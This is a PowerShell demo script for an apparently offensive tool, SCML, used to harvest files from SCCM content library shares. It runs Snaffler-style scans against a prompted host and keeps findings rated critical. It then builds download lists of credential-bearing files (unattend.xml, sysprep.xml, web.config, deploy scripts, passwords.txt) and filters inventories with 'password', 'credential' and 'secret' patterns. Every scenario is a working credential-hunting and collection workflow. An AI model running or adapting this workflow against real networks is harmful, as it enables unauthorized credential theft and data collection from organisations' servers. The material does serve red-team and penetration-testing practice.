<#
.SYNOPSIS
    SCML Download List Feature - Usage Examples
    
.DESCRIPTION
    This script demonstrates the --download-list feature which allows
    downloading specific files from a list, useful for targeted retrieval
    after Snaffler analysis or manual selection.
#>

$ErrorActionPreference = "Continue"

# Configuration
$SCMLPath = ".\bin\Release\SCML.exe"
if (-not (Test-Path $SCMLPath)) {
    $SCMLPath = ".\SCML.exe"
}

Write-Host @"
=========================================================
  SCML --download-list Feature Demo
=========================================================
"@ -ForegroundColor Cyan

# =============================================================================
# SCENARIO 1: Create download list from Snaffler findings
# =============================================================================

Write-Host "`n[SCENARIO 1] Creating download list from Snaffler findings" -ForegroundColor Yellow
Write-Host "=" * 60 -ForegroundColor DarkGray

# Step 1: Run Snaffler to find interesting files
$targetHost = Read-Host "Enter SCCM server hostname"
$inventoryFile = "snaffler_inventory.txt"

Write-Host "`n[*] Running Snaffler analysis..." -ForegroundColor Cyan
& $SCMLPath --host $targetHost --outfile $inventoryFile --snaffler --current-user

# Step 2: Parse Snaffler results for critical findings
$snafflerOutput = $inventoryFile.Replace(".txt", "_snaffler.txt")

if (Test-Path $snafflerOutput) {
    Write-Host "[*] Parsing Snaffler results for critical files..." -ForegroundColor Cyan
    
    # Extract file paths from BLACK and RED findings
    $criticalFiles = @()
    
    $content = Get-Content $snafflerOutput -Raw
    $fileMatches = [regex]::Matches($content, '\[FILE\] (\\\\[^\r\n]+)')
    
    foreach ($match in $fileMatches) {
        $filePath = $match.Groups[1].Value
        
        # Check if this file has critical findings
        $fileSection = $content.Substring($match.Index, [Math]::Min(500, $content.Length - $match.Index))
        if ($fileSection -match '\[(BLACK|RED)\]') {
            $criticalFiles += $filePath
            Write-Host "  Found critical: $filePath" -ForegroundColor Red
        }
    }
    
    # Create download list
    if ($criticalFiles.Count -gt 0) {
        $downloadListFile = "critical_files_to_download.txt"
        $criticalFiles | Out-File $downloadListFile -Encoding UTF8
        Write-Host "`n[+] Created download list: $downloadListFile" -ForegroundColor Green
        Write-Host "    Contains $($criticalFiles.Count) critical files" -ForegroundColor Green
        
        # Download the critical files
        Write-Host "`n[*] Downloading critical files..." -ForegroundColor Cyan
        & $SCMLPath --download-list $downloadListFile --download-dir "Critical_Files" --current-user
    }
}

# =============================================================================
# SCENARIO 2: Manual selection of specific files
# =============================================================================

Write-Host "`n[SCENARIO 2] Manual selection of specific files" -ForegroundColor Yellow
Write-Host "=" * 60 -ForegroundColor DarkGray

# Create a custom download list
$customList = @"
# Critical configuration files identified during reconnaissance
\\$targetHost\SCCMContentLib$\DataLib\PKG12345\unattend.xml
\\$targetHost\SCCMContentLib$\DataLib\PKG12345\sysprep.xml
\\$targetHost\SCCMContentLib$\DataLib\PKG67890\web.config
\\$targetHost\SCCMContentLib$\DataLib\PKG67890\app.config

# Deployment scripts with potential credentials
\\$targetHost\SCCMContentLib$\DataLib\PKG99999\deploy.ps1
\\$targetHost\SCCMContentLib$\DataLib\PKG99999\install.bat

# SCCM package files
\\$targetHost\SMSPKGD$\Security Updates_00\config.xml
\\$targetHost\SMSPKGD$\Custom Applications_00\deploy.ps1
"@

$customListFile = "custom_download_list.txt"
$customList | Out-File $customListFile -Encoding UTF8

Write-Host "[+] Created custom download list: $customListFile" -ForegroundColor Green

# Download with specific credentials
$useCredentials = Read-Host "`nUse specific credentials? (y/n)"

if ($useCredentials -eq 'y') {
    $username = Read-Host "Username"
    $domain = Read-Host "Domain"
    
    Write-Host "`n[*] Downloading files with credentials..." -ForegroundColor Cyan
    & $SCMLPath --download-list $customListFile --username $username --domain $domain --download-dir "Custom_Selection"
} else {
    Write-Host "`n[*] Downloading files with current user..." -ForegroundColor Cyan
    & $SCMLPath --download-list $customListFile --current-user --download-dir "Custom_Selection"
}

# =============================================================================
# SCENARIO 3: Multi-server download list
# =============================================================================

Write-Host "`n[SCENARIO 3] Multi-server download list" -ForegroundColor Yellow
Write-Host "=" * 60 -ForegroundColor DarkGray

# Create list with files from multiple servers
$multiServerList = @"
# Server 1: SCCM01
\\SCCM01.lab.local\SCCMContentLib$\DataLib\PKG10001\config.xml
\\SCCM01.lab.local\SCCMContentLib$\DataLib\PKG10002\deploy.ps1
\\SCCM01.lab.local\SMSPKGD$\Security Updates_00\install.ps1

# Server 2: SCCM02
\\SCCM02.lab.local\SCCMContentLib$\DataLib\PKG20001\settings.ini
\\SCCM02.lab.local\SCCMContentLib$\DataLib\PKG20002\unattend.xml
\\SCCM02.lab.local\SMSPKGD$\Custom Applications_00\config.xml

# Server 3: SCCM03
\\SCCM03.lab.local\SCCMContentLib$\DataLib\PKG30001\passwords.txt
\\SCCM03.lab.local\SCCMContentLib$\DataLib\PKG30002\credentials.xml
"@

$multiServerFile = "multi_server_download.txt"
$multiServerList | Out-File $multiServerFile -Encoding UTF8

Write-Host "[+] Created multi-server download list: $multiServerFile" -ForegroundColor Green
Write-Host "[*] This will efficiently group downloads by server to minimize connections" -ForegroundColor Cyan

& $SCMLPath --download-list $multiServerFile --download-dir "Multi_Server_Files" --current-user

# =============================================================================
# SCENARIO 4: Filter inventory to create download list
# =============================================================================

Write-Host "`n[SCENARIO 4] Filter inventory to create download list" -ForegroundColor Yellow
Write-Host "=" * 60 -ForegroundColor DarkGray

if (Test-Path $inventoryFile) {
    Write-Host "[*] Filtering inventory for high-value files..." -ForegroundColor Cyan
    
    # Filter for specific patterns
    $patterns = @(
        "unattend\.xml$",
        "sysprep\.xml$",
        "web\.config$",
        "app\.config$",
        "deploy\.ps1$",
        "install\.ps1$",
        "password",
        "credential",
        "secret"
    )
    
    $filteredFiles = @()
    $inventoryContent = Get-Content $inventoryFile
    
    foreach ($line in $inventoryContent) {
        foreach ($pattern in $patterns) {
            if ($line -match $pattern) {
                $filteredFiles += $line
                break
            }
        }
    }
    
    if ($filteredFiles.Count -gt 0) {
        $filteredListFile = "filtered_download_list.txt"
        $filteredFiles | Select-Object -Unique | Out-File $filteredListFile -Encoding UTF8
        
        Write-Host "[+] Created filtered download list: $filteredListFile" -ForegroundColor Green
        Write-Host "    Contains $($filteredFiles.Count) high-value files" -ForegroundColor Green
        
        # Limit downloads to prevent overwhelming
        if ($filteredFiles.Count -gt 50) {
            Write-Host "[!] Large number of files. Taking first 50 only." -ForegroundColor Yellow
            $filteredFiles | Select-Object -First 50 | Out-File $filteredListFile -Encoding UTF8
        }
        
        Write-Host "`n[*] Downloading filtered files..." -ForegroundColor Cyan
        & $SCMLPath --download-list $filteredListFile --download-dir "Filtered_Files" --current-user
    }
}

# =============================================================================
# SUMMARY
# =============================================================================

Write-Host "`n" -NoNewline
Write-Host "=" * 60 -ForegroundColor Green
Write-Host "DOWNLOAD LIST FEATURE SUMMARY" -ForegroundColor White
Write-Host "=" * 60 -ForegroundColor Green

Write-Host @"

The --download-list feature enables:

1. TARGETED DOWNLOADS after analysis
   - Parse Snaffler results → Download only critical files
   - Reduces bandwidth and storage usage

2. MULTI-SERVER EFFICIENCY
   - Groups files by server automatically
   - Minimizes SMB connections
   - Preserves directory structure

3. FLEXIBLE FILE SELECTION
   - Manual lists for specific files
   - Filtered lists from inventory
   - Cross-server file retrieval

4. CREDENTIAL SUPPORT
   - Works with all authentication methods
   - --current-user for domain environments
   - --username/--domain for specific accounts

USAGE SYNTAX:
  SCML.exe --download-list <file_list.txt> [options]

OPTIONS:
  --download-dir <dir>    Output directory (default: DownloadList_Out)
  --current-user          Use current Windows credentials
  --username <user>       Specific username
  --domain <domain>       Domain for authentication
  --password <pass>       Password (or omit to prompt)

FILE LIST FORMAT:
  One UNC path per line:
  \\server\share\path\to\file1.ext
  \\server\share\path\to\file2.ext
  # Comments are supported

INTEGRATION WORKFLOW:
  1. Run Snaffler: --snaffler
  2. Review results: _snaffler.txt
  3. Create list: Select critical files
  4. Download: --download-list critical.txt

"@ -ForegroundColor Cyan

# Display created files
Write-Host "Created Files:" -ForegroundColor Yellow
Get-ChildItem *download*.txt -ErrorAction SilentlyContinue | 
    Select-Object Name, Length, LastWriteTime | 
    Format-Table -AutoSize

# Display downloaded files
if (Test-Path "Critical_Files") {
    Write-Host "`nDownloaded Critical Files:" -ForegroundColor Yellow
    Get-ChildItem "Critical_Files" -Recurse -File | 
        Select-Object Name, Length, DirectoryName | 
        Format-Table -AutoSize
}